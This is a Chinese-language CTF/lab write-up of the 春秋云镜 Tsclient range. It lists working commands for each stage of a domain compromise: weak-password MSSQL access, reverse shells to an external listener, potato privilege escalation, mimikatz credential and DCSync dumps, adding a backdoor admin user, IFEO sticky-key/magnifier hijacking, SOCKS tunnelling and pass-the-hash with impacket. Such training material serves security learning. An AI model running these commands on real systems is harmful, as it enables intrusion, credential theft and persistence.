---
title: "春秋云镜 Tsclient"
onlyTitle: true
date: 2025-8-21 17:35:51
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8171.jpg

---



## 春秋云镜 Tscilent

### 一刷

fsacn扫到1433 MSSQL 账号sa/1qaz!QAZ弱密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250814212200771.png)

数据库shell工具MUDThttps://github.com/SafeGroceryStore/MDUT

MUDT报驱动程序异常，请左上角清理配置文件

连上之后发现只有较低的权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250814212508177.png)

systeminfo一下发现是Windows Server 2016，只可能是amd64（64位）的，而不是i386(32位)的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250814212958565.png)

Vshell新增监听，然后用命令或者生成监听器上传都可以弹回shell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250814220123858.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250814220211078.png)

因为系统是windows server 2016，大部分土豆提权方法都可用

https://xz.aliyun.com/news/7371

这里用https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe

上传SweetPotato后，用SweetPotato执行上传的vshell client.exe（不知道为什么我nc弹不回来）

```shell
SweetPotato.exe -a "tcp_windows_amd64.exe"
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821210652370.png)

flag1

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821211119913.png)

C:/godown/fscan.exe -h 172.22.8.18/24

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821211628067.png)

net user发现还有个john用户rdp登录的，可恶，怎么是xiafan

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821211732756.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821212043015.png)

如果是弹的cs，可以对这个进程进行一个注入

这里误入歧途了，不想再弹cs了（这个电脑还没下），用一手mimikatz

https://github.com/gentilkiwi/mimikatz/releases

输入mimikatz.exe运行

```sh
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821214257491.png)

找到了john的NTLM

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821214544714.png)

https://github.com/BeichenDream/SharpToken/releases

`SharpToken.exe execute "WIN-WEB\John" cmd true`

还是不行吗，后来从下面这个博客得知SharpToken缺少组件，根本运行不了

https://www.cnblogs.com/kingbridge/articles/17645128.html

直接添加一个管理员用户

```powershell
net user godown plmijbygcIOP!195 /add
net localgroup administrators godown /add
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821221320289.png)

也是连上了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821221538070.png)

服务器管理器-->管理-->添加角色1 和功能-->功能-->勾选.net3.5进行安装

再回到有管理员权限的shell执行SharpToken

`SharpToken.exe execute "WIN-WEB\John" cmd true`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250821222339294.png)

因为rdp上去你的用户是自己定义的用户，vshell里是原生的Admin，共享只共享给了admin。另外，原来这个机器本来只安装了.net4.8，SharpToken应该用.net4.8编译的上传运行，而下载的是用.net3.5编译的，所以是运行不了的

但是net use和dir 共享目录还是用不了，拒绝访问

到处翻wp，说用psexec连接，然后用msf的incognito，唉哟还得下impacket和msf，孩他妈不如cs了

https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/



二刷用cs做了，明天再说

### 二刷

妈的，两个小时想把cs服务器挂虚拟机然后花生壳穿出去（不想用vps），结果TM一直弄不好，server挂vps 5分钟搞好了。。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822155209308.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822155417117.png)

随手一抓hash

对john的svchost守护进程注入cs shell进行上线

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822155608608.png)

弹回user John权限的shell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822155812305.png)

net use查看共享资源看到有`\\TSCLIENT\C`

```shell
shell dir \\TSCLIENT\C
shell type \\TSCLIENT\C\credential.txt
```

共享目录里的credential.txt

```txt
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
```

上传gost执行`gost -L socks5://:5555?bind=true`

本地执行`gost -L rtcp://:2222/39.98.112.57:22 -F socks5://39.98.112.57:5555`

配置profixier

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822161454110.png)

尝试rdp远程登录172.22.8.31，账密在上面的credential.txt，提示密码过期

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822161633597.png)

镜像劫持

rdesktop能在kali用使用rdp远程连接windows

先配个proxychains4

```shell
sudo vi /etc/proxychains4.conf
```

添加`socks5 39.98.112.57 5555`并删掉默认的socks4代理

proxychains4 rdesktop 172.22.8.31

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822162100555.png)

发现这个ip改不了，只能改172.22.8.46去登录

proxychains4 rdesktop 172.22.8.46

修改密码plmijbygc!1

登录后

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822162628561.png)

powershell中用get-acl命令查看注册表中该用户是否有修改注册表的权限，fl命令是为了把一行显示为多行

```shell
get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822163117195.png)

```
NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey

# 表示所有经过身份验证的用户（即登录到系统的用户）被允许对该注册表项执行以下操作：设置值（SetValue）、创建子项（CreateSubKey）和读取键（ReadKey）。
```

然后修改注册表进行影像劫持，执行下个命令（劫持放大镜程序提权）

```shell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

然后锁定用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822163338859.png)

点击右下角的放大镜

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822163812046.png)

也可以用劫持粘滞键，执行下面命令然后5次shift弹出cmd即为管理员权限shell

`REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"`

找到flag2

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822163926188.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822164013995.png)

flag02:flag{6249085b-3871-4a3d-b393-ccb884ca6893}

执行命令，发现这台机器是域管

```shell
net group "domain admins" /domain
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822164310797.png)



然后上传shell，怎么上传？在rdesktop上传不了，那又退到windows连rdp就能上传了

传mimikatz上去dump密码

```text
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822170649908.png)

smbexec传递票据拿到最后一个flag

proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk

登上去直接就是管理员权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822171008131.png)

`dir c:\Users\Administrator\flag\flag03.txt`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822171349788.png)



另外，TSClient一些姿势https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg

